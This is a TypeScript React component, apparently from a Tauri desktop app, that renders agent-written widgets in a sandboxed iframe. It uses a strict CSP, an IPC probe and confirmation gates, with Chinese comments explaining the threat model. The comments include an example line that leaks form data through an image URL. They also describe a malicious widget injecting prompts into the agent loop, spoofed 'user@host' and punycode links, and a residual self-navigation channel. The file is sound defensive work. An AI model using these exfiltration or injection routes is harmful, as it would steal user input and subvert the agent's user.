// 部件画布（0.0.67）：把 show_widget 工具产出的 agent 编写 HTML/SVG/JS 渲染进一个
// 强隔离的 iframe。安全模型（不可妥协）：
//   sandbox="allow-scripts"，**绝不**带 allow-same-origin —— 在同源上叠加 allow-same-origin
//   会让 frame 自行卸下 sandbox 逃逸。单独 allow-scripts ＝ null/opaque 源：无 cookie/存储、
//   读不到父 DOM、所有请求 Origin:null。
//   即便 Tauri 2.11.2 已修复 IPC 注入到 null 源 iframe（GHSA-57fm-592m-34r7），仍在 wrapper
//   里加 fail-closed 探针兜底。
//   0.0.68 修正（基于运行时实测）：WebView2 会把 Tauri 的 __TAURI_INTERNALS__ 注入到**所有** frame
//   （含本 null 源 iframe），所以旧版「探测到该全局存在即拒渲染」是**必然误报**——每个 widget 都被挡。
//   实测：从 null 源 iframe 真去 invoke('get_app_info') 被 Tauri **当场拒绝**（"Origin header is not a
//   valid URL" + 缺 __TAURI_INVOKE_KEY__），即「全局存在但打不通」、隔离有效。故把探针从「看名字」改成
//   「看是否真能打通」：异步真调一次无害只读命令，**唯有它竟然 resolve 成功**（IPC 真打通=真出事）才
//   window.stop()+抹掉页面拒渲染；被拒/超时/无 invoke（正常隔离）则不动，widget 正常渲染。
//
// 网络出口（0.0.67 安全审查后修正——勿再误述为「零网络」）：
//   · 子资源出口（img/script/style/font 的 GET）已用「default-src 'none' + 仅 data:/blob:、零外部
//     主机」彻底封死——这是会偷「用户在 widget 表单里输入的数据」的静默信道，必须关。
//   · connect-src 'none' 封 fetch/XHR/WebSocket/sendBeacon。
//   · 唯一**无法**在 CSP/sandbox 文档层阻断的残留通道是脚本「自导航」(location.href=外部URL)：它会
//     让整个 widget 跳走/变白，**可见、一次性、噪声大**，不是静默信道；且能植入恶意 widget 的 agent
//     本就已被 prompt 注入污染、另有渠道。我们接受该残留并如实记录，不假称已 100% 断网。
// 桥接（sendPrompt/openLink）一律视为不可信来源：见 onMessage 里的用户确认门控。

import { useEffect, useRef, useState } from "react";
import { invoke } from "@tauri-apps/api/core";
import type { WidgetPart } from "../types";

/** 把 agent code 包进固定可信 wrapper，构造 iframe 的 srcdoc。code 为 HTML/SVG/JS，**原样**插入（不转义）。 */
function buildSrcdoc(code: string, theme: Record<string, string>): string {
  // 严格 CSP：default-src 'none' 全封；脚本/样式只放行 inline，**不放行任何外部主机**。
  // 安全审查教训：connect-src 'none' 只挡 fetch/XHR/WS/sendBeacon，**挡不住**经 img-src/script-src/
  // style-src/font-src 放行域发出的子资源 GET——白名单里只要有外部主机，其完整 URL 路径/查询串即一条
  // 静默外泄信道（new Image().src='https://cdn/'+btoa(secret)，能偷用户在 widget 表单里输入的数据）。
  // 故移除全部外部 CDN/字体域，子资源只允许 data:/blob:，真正「零外联」；并去掉 'unsafe-eval'（inline
  // 不需要，留着只扩大注入面）。widget 须自包含、不得依赖任何 CDN 库。
  const csp =
    "default-src 'none'; " +
    "script-src 'unsafe-inline'; " +
    "style-src 'unsafe-inline'; " +
    "img-src data: blob:; " +
    "font-src data:; " +
    "connect-src 'none'; base-uri 'none'; form-action 'none'; frame-src 'none'";

  // 把宿主当前主题（已 resolve 的具体色值）注入为 widget 侧 CSS 变量，
  // 模型被告知使用这些变量名，light/dark 由宿主 getComputedStyle 决定。
  const vars = Object.entries(theme)
    .map(([k, v]) => `      ${k}: ${v};`)
    .join("\n");

  // fail-closed 功能式探针：放在 <head>、跑在 agent 代码之前。不再判断 Tauri 全局「是否存在」
  // （__TAURI_INTERNALS__ 必被注入，判存在=必然误报），而是**异步真调一次无害只读命令**：
  // 唯有它竟然 resolve 成功（IPC 真打通=隔离失败）才 window.stop()+抹掉页面拒渲染；
  // 被拒/超时/无 invoke（正常隔离，实测即此路）则不动，让 widget 正常渲染。
  // 代价：正常情况下每次渲染会触发一次被 Tauri 拒绝的 invoke，dev 控制台会打一条 warning（生产无控制台）。
  const probe =
    "(function(){try{" +
    "var I=window.__TAURI_INTERNALS__;" +
    "if(!I||typeof I.invoke!=='function')return;" +
    "Promise.resolve(I.invoke('get_app_info',{})).then(function(){" +
    " try{window.stop();}catch(e){}" +
    " document.documentElement.innerHTML='<body style=\"margin:0\"><p style=\"color:#c00;font:13px system-ui;padding:12px\">\\u26A0 widget \\u9694\\u79BB\\u5931\\u8D25\\uFF08\\u68C0\\u6D4B\\u5230\\u53EF\\u8C03\\u7528\\u540E\\u7AEF\\uFF09\\uFF0C\\u5DF2\\u62D2\\u7EDD\\u6E32\\u67D3</p></body>';" +
    "},function(){});" + // rejected = 正常隔离，忽略
    "}catch(e){}})();";

  return (
    "<!doctype html><html><head><meta charset=\"utf-8\">" +
    `<meta http-equiv="Content-Security-Policy" content="${csp}">` +
    // 探针脚本置于 head、CSP meta 之后、其余内容之前（尽早起跑；其判定是异步的，不阻塞渲染）。
    "<script>" + probe + "</script>" +
    "<style>\n" +
    "    :root {\n" +
    vars +
    "\n    }\n" +
    "    html, body { margin: 0; }\n" +
    "    body { font-family: system-ui, sans-serif; color: var(--color-text); background: transparent; }\n" +
    "</style></head><body>\n" +
    code +
    "\n<script>\n" +
    "(function(){\n" +
    "  window.sendPrompt = function(t){ parent.postMessage({__mdgaWidget:'sendPrompt', text: String(t).slice(0,4000)}, '*'); };\n" +
    "  window.openLink = function(u){ parent.postMessage({__mdgaWidget:'openLink', url: String(u)}, '*'); };\n" +
    "  function rh(){ parent.postMessage({__mdgaWidget:'resize', height: Math.min(document.documentElement.scrollHeight, 2000)}, '*'); }\n" +
    "  window.addEventListener('load', rh);\n" +
    "  try{ new ResizeObserver(rh).observe(document.body); }catch(e){}\n" +
    "})();\n" +
    "</script>\n" +
    "</body></html>"
  );
}

/** 渲染时从宿主根元素读取已 resolve 的主题色值，映射成 widget 侧变量名。 */
function readHostTheme(): Record<string, string> {
  const cs = getComputedStyle(document.documentElement);
  const g = (name: string) => cs.getPropertyValue(name).trim();
  return {
    "--color-text": g("--text"),
    "--color-bg": g("--surface"),
    "--color-text-secondary": g("--text-2"),
    "--color-text-tertiary": g("--text-3"),
    "--border": g("--border"),
    "--brand": g("--brand"),
    "--color-success": g("--success"),
    "--color-danger": g("--danger"),
    "--on-brand": g("--on-brand"),
  };
}

/**
 * 沙箱化的部件卡片。
 * @param part   WidgetPart（code + 可选 title/kind）。
 * @param onSendPrompt  widget 内调用 sendPrompt(text) 时回灌到 agent 的发送函数；**仅在用户确认后**调用。
 */
export function WidgetCard({
  part,
  onSendPrompt,
}: {
  part: WidgetPart;
  onSendPrompt?: (text: string) => void;
}) {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [height, setHeight] = useState(120);
  // sendPrompt 确认门控的冷却闸：记录上一次确认框关闭的时刻，冷却窗口内丢弃后续 sendPrompt，
  // 防恶意 widget 循环调用 sendPrompt 弹出连串阻塞确认框（confirm 轰炸 / 骚扰）。
  // 不能用「pending 布尔」节流——window.confirm 同步阻塞，pending 在同一事件任务内即置真又复位，
  // 跨消息永不短路（形同虚设）；故改用基于时间戳的冷却。
  const lastPromptAtRef = useRef(0);

  // 主题随 code 在挂载时一次性 resolve；code 变化时通过 key 整体重挂（见下方 key）。
  const srcdoc = buildSrcdoc(part.code, readHostTheme());

  useEffect(() => {
    function onMessage(event: MessageEvent) {
      // 只接受来自**本 iframe** contentWindow 且带 __mdgaWidget 标记的消息（防其它 frame / 扩展伪造）。
      const win = iframeRef.current?.contentWindow;
      if (!win || event.source !== win) return;
      const data = event.data as { __mdgaWidget?: string; height?: number; text?: string; url?: string };
      if (!data || typeof data.__mdgaWidget !== "string") return;

      if (data.__mdgaWidget === "resize") {
        const h = typeof data.height === "number" ? data.height : 120;
        setHeight(Math.max(80, Math.min(2000, h)));
      } else if (data.__mdgaWidget === "sendPrompt") {
        // sendPrompt 不可信：widget 代码可在 load/定时器里无人值守地自动调用，把任意文本当「用户输入」
        // 灌进 agent 循环（confused-deputy / 提示注入洗白）。故**必须经用户显式确认**才发，绝不自动驱动。
        // 父侧自行截断（发送方的 slice 可被绕过），并以确认框关闭后的冷却窗口节流防 confirm 轰炸。
        const text = (typeof data.text === "string" ? data.text : "").slice(0, 4000);
        if (!text.trim() || !onSendPrompt) return;
        // 上一次确认处理后 1s 内到达的 sendPrompt 一律丢弃（限制连串阻塞确认框的弹出频率）。
        if (Date.now() - lastPromptAtRef.current < 1000) return;
        const preview = text.length > 300 ? text.slice(0, 300) + "…" : text;
        const ok = window.confirm(
          "此 widget 想代你向 AI 发送下面这条消息（不是你本人输入的）：\n\n" + preview + "\n\n确定发送吗？"
        );
        lastPromptAtRef.current = Date.now(); // 以确认框关闭时刻为冷却起点
        if (ok) onSendPrompt(text);
      } else if (data.__mdgaWidget === "openLink") {
        const url = typeof data.url === "string" ? data.url : "";
        if (!url) return;
        // 确认框里**醒目展示真实主机**并剥离迷惑性 userinfo（http://good.com@evil.tld 真实落点是 evil.tld）、
        // 标注非 ASCII/Punycode 仿冒域名，避免用户被攻击者完全可控的 URL 文本诱导点「确定」。
        let host = "(无法解析)";
        let warn = "";
        try {
          const u = new URL(url);
          host = u.host;
          if (u.username || u.password) warn += "\n⚠ 链接带「用户名@」前缀，真实站点是上面的主机，请核对。";
          if (/[^\x00-\x7F]/.test(u.hostname) || /(^|\.)xn--/.test(u.hostname))
            warn += "\n⚠ 域名含非 ASCII / Punycode 字符，可能是仿冒域名。";
        } catch {
          /* 非法 URL：host 保持「无法解析」，后端仍会再校验 http(s) */
        }
        // 展示用的「完整地址」需归一：把所有空白（含换行）折叠为单空格并限长，
        // 防恶意 url 塞大量换行把可信的「站点主机」行挤出可视区（含控制字符的 url 后端也会拒）。
        const shownUrl = url.replace(/\s+/g, " ").slice(0, 200) + (url.length > 200 ? "…" : "");
        if (window.confirm("在浏览器打开此链接？\n\n站点主机：" + host + warn + "\n\n完整地址：\n" + shownUrl)) {
          invoke("open_external_url", { url }).catch(() => {});
        }
      }
    }
    window.addEventListener("message", onMessage);
    return () => window.removeEventListener("message", onMessage);
  }, [onSendPrompt]);

  return (
    <div className="widget-card">
      {part.title && <div className="widget-card__title">{part.title}</div>}
      <iframe
        // code 变化时整体重挂（避免旧 srcdoc/监听残留）。
        key={part.code}
        ref={iframeRef}
        className="widget-card__frame"
        title={part.title ?? "widget"}
        sandbox="allow-scripts"
        srcDoc={srcdoc}
        style={{
          width: "100%",
          height,
          border: "1px solid var(--border)",
          borderRadius: 8,
          background: "transparent",
        }}
      />
    </div>
  );
}
